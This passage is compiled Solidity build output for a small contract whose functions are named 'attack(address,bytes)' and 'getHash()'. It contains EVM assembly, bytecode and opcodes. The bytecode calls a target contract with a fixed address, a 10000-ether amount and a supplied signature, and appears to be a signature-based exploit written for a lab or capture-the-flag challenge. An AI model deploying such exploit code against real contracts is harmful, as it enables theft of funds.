\"#utility.yul\":5800:5803   */\n      dup5\n        /* \"#utility.yul\":5796:5835   */\n      add\n        /* \"#utility.yul\":5789:5835   */\n      swap2\n      pop\n        /* \"#utility.yul\":5558:5841   */\n      pop\n        /* \"#utility.yul\":5468:5841   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5847:6547   */\n    tag_15:\n        /* \"#utility.yul\":6072:6076   */\n      0x00\n        /* \"#utility.yul\":6110:6113   */\n      0x80\n        /* \"#utility.yul\":6099:6108   */\n      dup3\n        /* \"#utility.yul\":6095:6114   */\n      add\n        /* \"#utility.yul\":6087:6114   */\n      swap1\n      pop\n        /* \"#utility.yul\":6124:6195   */\n      tag_133\n        /* \"#utility.yul\":6192:6193   */\n      0x00\n        /* \"#utility.yul\":6181:6190   */\n      dup4\n        /* \"#utility.yul\":6177:6194   */\n      add\n        /* \"#utility.yul\":6168:6174   */\n      dup8\n        /* \"#utility.yul\":6124:6195   */\n      tag_44\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":6205:6277   */\n      tag_134\n        /* \"#utility.yul\":6273:6275   */\n      0x20\n        /* \"#utility.yul\":6262:6271   */\n      dup4\n        /* \"#utility.yul\":6258:6276   */\n      add\n        /* \"#utility.yul\":6249:6255   */\n      dup7\n        /* \"#utility.yul\":6205:6277   */\n      tag_44\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":6287:6389   */\n      tag_135\n        /* \"#utility.yul\":6385:6387   */\n      0x40\n        /* \"#utility.yul\":6374:6383   */\n      dup4\n        /* \"#utility.yul\":6370:6388   */\n      add\n        /* \"#utility.yul\":6361:6367   */\n      dup6\n        /* \"#utility.yul\":6287:6389   */\n      tag_49\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":6436:6445   */\n      dup2\n        /* \"#utility.yul\":6430:6434   */\n      dup2\n        /* \"#utility.yul\":6426:6446   */\n      sub\n        /* \"#utility.yul\":6421:6423   */\n      0x60\n        /* \"#utility.yul\":6410:6419   */\n      dup4\n        /* \"#utility.yul\":6406:6424   */\n      add\n        /* \"#utility.yul\":6399:6447   */\n      mstore\n        /* \"#utility.yul\":6464:6540   */\n      tag_136\n        /* \"#utility.yul\":6535:6539   */\n      dup2\n        /* \"#utility.yul\":6526:6532   */\n      dup5\n        /* \"#utility.yul\":6464:6540   */\n      tag_53\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":6456:6540   */\n      swap1\n      pop\n        /* \"#utility.yul\":5847:6547   */\n      swap6\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6553:6647   */\n    tag_54:\n        /* \"#utility.yul\":6586:6594   */\n      0x00\n        /* \"#utility.yul\":6634:6639   */\n      dup2\n        /* \"#utility.yul\":6630:6632   */\n      0x60\n        /* \"#utility.yul\":6626:6640   */\n      shl\n        /* \"#utility.yul\":6605:6640   */\n      swap1\n      pop\n        /* \"#utility.yul\":6553:6647   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6653:6747   */\n    tag_55:\n        /* \"#utility.yul\":6692:6699   */\n      0x00\n        /* \"#utility.yul\":6721:6741   */\n      tag_139\n        /* \"#utility.yul\":6735:6740   */\n      dup3\n        /* \"#utility.yul\":6721:6741   */\n      tag_54\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":6710:6741   */\n      swap1\n      pop\n        /* \"#utility.yul\":6653:6747   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6753:6853   */\n    tag_56:\n        /* \"#utility.yul\":6792:6799   */\n      0x00\n        /* \"#utility.yul\":6821:6847   */\n      tag_141\n        /* \"#utility.yul\":6841:6846   */\n      dup3\n        /* \"#utility.yul\":6821:6847   */\n      tag_55\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":6810:6847   */\n      swap1\n      pop\n        /* \"#utility.yul\":6753:6853   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6859:7016   */\n    tag_57:\n        /* \"#utility.yul\":6964:7009   */\n      tag_143\n        /* \"#utility.yul\":6984:7008   */\n      tag_144\n        /* \"#utility.yul\":7002:7007   */\n      dup3\n        /* \"#utility.yul\":6984:7008   */\n      tag_29\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":6964:7009   */\n      tag_56\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":6959:6962   */\n      dup3\n        /* \"#utility.yul\":6952:7010   */\n      mstore\n        /* \"#utility.yul\":6859:7016   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7022:7101   */\n    tag_58:\n        /* \"#utility.yul\":7061:7068   */\n      0x00\n        /* \"#utility.yul\":7090:7095   */\n      dup2\n        /* \"#utility.yul\":7079:7095   */\n      swap1\n      pop\n        /* \"#utility.yul\":7022:7101   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7107:7264   */\n    tag_59:\n        /* \"#utility.yul\":7212:7257   */\n      tag_147\n        /* \"#utility.yul\":7232:7256   */\n      tag_148\n        /* \"#utility.yul\":7250:7255   */\n      dup3\n        /* \"#utility.yul\":7232:7256   */\n      tag_46\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":7212:7257   */\n      tag_58\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":7207:7210   */\n      dup3\n        /* \"#utility.yul\":7200:7258   */\n      mstore\n        /* \"#utility.yul\":7107:7264   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7270:7808   */\n    tag_24:\n        /* \"#utility.yul\":7438:7441   */\n      0x00\n        /* \"#utility.yul\":7453:7528   */\n      tag_150\n        /* \"#utility.yul\":7524:7527   */\n      dup3\n        /* \"#utility.yul\":7515:7521   */\n      dup7\n        /* \"#utility.yul\":7453:7528   */\n      tag_57\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":7553:7555   */\n      0x14\n        /* \"#utility.yul\":7548:7551   */\n      dup3\n        /* \"#utility.yul\":7544:7556   */\n      add\n        /* \"#utility.yul\":7537:7556   */\n      swap2\n      pop\n        /* \"#utility.yul\":7566:7641   */\n      tag_151\n        /* \"#utility.yul\":7637:7640   */\n      dup3\n        /* \"#utility.yul\":7628:7634   */\n      dup6\n        /* \"#utility.yul\":7566:7641   */\n      tag_59\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":7666:7668   */\n      0x20\n        /* \"#utility.yul\":7661:7664   */\n      dup3\n        /* \"#utility.yul\":7657:7669   */\n      add\n        /* \"#utility.yul\":7650:7669   */\n      swap2\n      pop\n        /* \"#utility.yul\":7679:7754   */\n      tag_152\n        /* \"#utility.yul\":7750:7753   */\n      dup3\n        /* \"#utility.yul\":7741:7747   */\n      dup5\n        /* \"#utility.yul\":7679:7754   */\n      tag_57\n      jump\t// in\n    tag_152:\n        /* \"#utility.yul\":7779:7781   */\n      0x14\n        /* \"#utility.yul\":7774:7777   */\n      dup3\n        /* \"#utility.yul\":7770:7782   */\n      add\n        /* \"#utility.yul\":7763:7782   */\n      swap2\n      pop\n        /* \"#utility.yul\":7799:7802   */\n      dup2\n        /* \"#utility.yul\":7792:7802   */\n      swap1\n      pop\n        /* \"#utility.yul\":7270:7808   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220acd96a3f55b6ae1f4a8586b443815e311e3e2b0e71356a214cf524f3652ceec164736f6c63430008100033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50610605806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638c5a2ac81461003b578063d13319c414610057575b600080fd5b61005560048036038101906100509190610370565b610075565b005b61005f610168565b60405161006c91906103e5565b60405180910390f35b8173ffffffffffffffffffffffffffffffffffffffff166376b82a91737e5f4552091a69125d5dfcb7b8c2659029395bdf3069021e19e0c9bab2400000856040518563ffffffff1660e01b81526004016100d294939291906104dd565b600060405180830381600087803b1580156100ec57600080fd5b505af1158015610100573d6000803e3d6000fd5b505050508173ffffffffffffffffffffffffffffffffffffffff1663fa391c646040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014c57600080fd5b505af1158015610160573d6000803e3d6000fd5b505050505050565b6000737e5f4552091a69125d5dfcb7b8c2659029395bdf69021e19e0c9bab24000003060405160200161019d93929190610592565b60405160208183030381529060405280519060200120905090565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101f7826101cc565b9050919050565b610207816101ec565b811461021257600080fd5b50565b600081359050610224816101fe565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61027d82610234565b810181811067ffffffffffffffff8211171561029c5761029b610245565b5b80604052505050565b60006102af6101b8565b90506102bb8282610274565b919050565b600067ffffffffffffffff8211156102db576102da610245565b5b6102e482610234565b9050602081019050919050565b82818337600083830152505050565b600061031361030e846102c0565b6102a5565b90508281526020810184848401111561032f5761032e61022f565b5b61033a8482856102f1565b509392505050565b600082601f8301126103575761035661022a565b5b8135610367848260208601610300565b91505092915050565b60008060408385031215610387576103866101c2565b5b600061039585828601610215565b925050602083013567ffffffffffffffff8111156103b6576103b56101c7565b5b6103c285828601610342565b9150509250929050565b6000819050919050565b6103df816103cc565b82525050565b60006020820190506103fa60008301846103d6565b92915050565b610409816101ec565b82525050565b6000819050919050565b6000819050919050565b6000819050919050565b600061044861044361043e8461040f565b610423565b610419565b9050919050565b6104588161042d565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561049857808201518184015260208101905061047d565b60008484015250505050565b60006104af8261045e565b6104b98185610469565b93506104c981856020860161047a565b6104d281610234565b840191505092915050565b60006080820190506104f26000830187610400565b6104ff6020830186610400565b61050c604083018561044f565b818103606083015261051e81846104a4565b905095945050505050565b60008160601b9050919050565b600061054182610529565b9050919050565b600061055382610536565b9050919050565b61056b610566826101ec565b610548565b82525050565b6000819050919050565b61058c61058782610419565b610571565b82525050565b600061059e828661055a565b6014820191506105ae828561057b565b6020820191506105be828461055a565b60148201915081905094935050505056fea2646970667358221220acd96a3f55b6ae1f4a8586b443815e311e3e2b0e71356a214cf524f3652ceec164736f6c63430008100033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x605 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8C5A2AC8 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD13319C4 EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x370 JUMP JUMPDEST PUSH2 0x75 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x168 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0x3E5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x76B82A91 PUSH20 0x7E5F4552091A69125D5DFCB7B8C2659029395BDF ADDRESS PUSH10 0x21E19E0C9BAB2400000 DUP6 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD2 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x4DD JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x100 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFA391C64 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x160 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0x7E5F4552091A69125D5DFCB7B8C2659029395BDF PUSH10 0x21E19E0C9BAB2400000 ADDRESS PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x19D SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x592 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F7 DUP3 PUSH2 0x1CC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x207 DUP2 PUSH2 0x1EC JUMP JUMPDEST DUP2 EQ PUSH2 0x212 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x224 DUP2 PUSH2 0x1FE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x27D DUP3 PUSH2 0x234 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x29C JUMPI PUSH2 0x29B PUSH2 0x245 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2AF PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH2 0x2BB DUP3 DUP3 PUSH2 0x274 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x2DB JUMPI PUSH2 0x2DA PUSH2 0x245 JUMP JUMPDEST JUMPDEST PUSH2 0x2E4 DUP3 PUSH2 0x234 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x313 PUSH2 0x30E DUP5 PUSH2 0x2C0 JUMP JUMPDEST PUSH2 0x2A5 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x32F JUMPI PUSH2 0x32E PUSH2 0x22F JUMP JUMPDEST JUMPDEST PUSH2 0x33A DUP5 DUP3 DUP6 PUSH2 0x2F1 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x357 JUMPI PUSH2 0x356 PUSH2 0x22A JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x367 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x300 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x387 JUMPI PUSH2 0x386 PUSH2 0x1C2 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x395 DUP6 DUP3 DUP7 ADD PUSH2 0x215 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x3B6 JUMPI PUSH2 0x3B5 PUSH2 0x1C7 JUMP JUMPDEST JUMPDEST PUSH2 0x3C2 DUP6 DUP3 DUP7 ADD PUSH2 0x342 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3DF DUP2 PUSH2 0x3CC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3FA PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3D6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x409 DUP2 PUSH2 0x1EC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x448 PUSH2 0x443 PUSH2 0x43E DUP5 PUSH2 0x40F JUMP JUMPDEST PUSH2 0x423 JUMP JUMPDEST PUSH2 0x419 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x458 DUP2 PUSH2 0x42D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x498 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x47D JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4AF DUP3 PUSH2 0x45E JUMP JUMPDEST PUSH2 0x4B9 DUP2 DUP6 PUSH2 0x469 JUMP JUMPDEST SWAP4 POP PUSH2 0x4C9 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x47A JUMP JUMPDEST PUSH2 0x4D2 DUP2 PUSH2 0x234 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x4F2 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0x400 JUMP JUMPDEST PUSH2 0x4FF PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x400 JUMP JUMPDEST PUSH2 0x50C PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x44F JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x51E DUP2 DUP5 PUSH2 0x4A4 JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x541 DUP3 PUSH2 0x529 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x553 DUP3 PUSH2 0x536 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x56B PUSH2 0x566 DUP3 PUSH2 0x1EC JUMP JUMPDEST PUSH2 0x548 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x58C PUSH2 0x587 DUP3 PUSH2 0x419 JUMP JUMPDEST PUSH2 0x571 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59E DUP3 DUP7 PUSH2 0x55A JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP PUSH2 0x5AE DUP3 DUP6 PUSH2 0x57B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH2 0x5BE DUP3 DUP5 PUSH2 0x55A JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAC 0xD9 PUSH11 0x3F55B6AE1F4A8586B44381 0x5E BALANCE 0x1E RETURNDATACOPY 0x2B 0xE PUSH18 0x356A214CF524F3652CEEC164736F6C634300 ADDMOD LT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "308200",
						"executionCost": "349",
						"totalCost": "308549"
					},
					"external": {
						"attack(address,bytes)": "infinite",
						"getHash()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(address,bytes)": "8c5a2ac8",
					"getHash()": "d13319c4"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}